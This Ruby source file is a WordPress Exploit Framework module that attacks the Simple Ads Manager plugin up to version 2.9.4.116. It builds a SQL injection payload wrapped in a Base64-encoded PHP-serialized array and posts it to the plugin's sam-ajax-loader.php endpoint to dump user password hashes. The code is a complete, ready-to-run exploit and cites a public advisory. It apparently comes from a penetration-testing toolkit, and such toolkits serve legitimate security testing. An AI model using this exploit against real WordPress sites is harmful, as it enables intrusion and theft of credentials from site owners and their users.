# frozen_string_literal: true

require 'base64'

class Wpxf::Auxiliary::SimpleAdsManagerHashDump < Wpxf::Module
  include Wpxf::WordPress::HashDump

  def initialize
    super

    update_info(
      name: 'Simple Ads Manager <= 2.9.4.116',
      author: [
        'Kacper Szurek', # Vulnerability discovery
        'rastating'      # WPXF module
      ],
      references: [
        ['URL', 'http://security.szurek.pl/simple-ads-manager-294116-sql-injection.html'],
        ['WPVDB', '8357']
      ],
      date: 'Dec 30 2015'
    )
  end

  def check
    check_plugin_version_from_readme('simple-ads-manager', '2.9.5.118', '2.9.4.116')
  end

  def reveals_one_row_per_request
    true
  end

  def hashdump_number_of_cols
    23
  end

  def vulnerable_url
    normalize_uri(wordpress_url_plugins, 'simple-ads-manager', 'sam-ajax-loader.php')
  end

  def encode_query(query)
    query = ") UNION (#{query}"
    serialized = "a:4:{s:2:\"WC\";s:3:\"1=0\";s:3:\"WCT\";s:0:\"\";s:3:\"WCW\";s:#{query.bytesize}:\"#{query}\";s:4:\"WC2W\";s:0:\"\";}"
    Base64.strict_encode64(serialized)
  end

  def hashdump_sql_statement
    encode_query(super)
  end

  def hashdump_prefix_fingerprint_statement
    encode_query(super)
  end

  def hashdump_request_body
    {
      'action' => 'load_place',
      'id' => '0',
      'pid' => '1',
      'wc' => hashdump_sql_statement
    }
  end

  def hashdump_request_method
    :post
  end
end
